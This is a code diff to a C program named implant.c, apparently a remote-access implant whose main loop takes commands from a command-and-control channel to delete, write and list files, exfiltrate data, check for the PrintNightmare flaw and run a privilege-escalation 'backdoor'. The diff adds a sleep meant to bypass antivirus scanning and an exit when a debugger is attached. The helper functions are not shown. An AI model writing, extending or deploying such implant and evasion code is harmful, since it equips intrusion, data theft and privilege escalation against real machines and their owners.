@@ -347,18 +347,25 @@ end:
 
 
 
-// cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
-// cl implant.c /Fe:implant.exe
+// cl implant.c /Fe:implant.exe /DDEBUG /DEBUG /Zi
+// cl implant.c /Os /Fe:implant.exe /Zi
 int main() {
     int status = 0;
     unsigned int len = 0;
     char buffer[1024] = {0};
 
+    // Sleep to bypass AV scan
+    Sleep(5000);
+
+    // Check if a debugger is attached
+    if (IsDebuggerPresent()) {
+        return 0;
+    }
 
     // Network setup
     status = SetupComms();
     if (status < 0) {
-        c2_log("[!] ERROR in comms setup\n");
+        c2_log("[!] Error in comms setup\n");
         TearDownComms();
         return -1;
     }
@@ -394,10 +401,10 @@ int main() {
 
         else if (strncmp(buffer, "rm ", 3) == 0) {
             if(rm(buffer + 3)) {
-                c2_send("Success", 7);
+                c2_send("[+] Success", 11);
             }
             else {
-                c2_send("Failed", 6);
+                c2_send("[!] Failed", 10);
             }
         }
 
@@ -416,10 +423,10 @@ int main() {
 
             int num = write(buffer + idx1, buffer + idx2);
             if (num == 0) {
-                c2_send("[!] write failed", 16);
+                c2_send("[!] Error", 9);
             }
             else {
-                c2_send("[+] write success", 17);
+                c2_send("[+] Success", 11);
             }
         }
 
@@ -442,7 +449,7 @@ int main() {
                 c2_send(listing, strlen(listing));
             }
             else {
-                c2_send("[!] Error in ls", 15);
+                c2_send("[!] Error", 9);
             }
         }
 
@@ -450,7 +457,7 @@ int main() {
             if (n >= 7) {
                 status = Exfil(buffer + 6);
                 if (status > 0) { c2_send("OK", 2); }
-                else { c2_send("[!] exfil error", 15); }
+                else { c2_send("[!] Error", 9); }
             }
             else {
                 c2_send("[!] No arg", 10);
@@ -461,13 +468,13 @@ int main() {
             status = CheckForNightmare();
             if (status == 1) { c2_send("[+] Host vulnerable", 19); }
             else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
-            else { c2_send("[!] Error in check", 18); }
+            else { c2_send("[!] Error", 9); }
         }
 
         else if (strncmp(buffer, "backdoor", 8) == 0) {
             status = BackDoor();
-            if (status == 0) { c2_send("[+] Escalate sucess", 19); }
-            else { c2_send("[!] Error in privesc", 20); }
+            if (status == 0) { c2_send("[+] Sucess", 10); }
+            else { c2_send("[!] Error", 9); }
         }
 
         else {
@@ -476,14 +483,10 @@ int main() {
 
         
         
-
         // Clear buffer
         memset(buffer, 0, 1024);
     }
     
-
-
-
 
 
     TearDownComms();
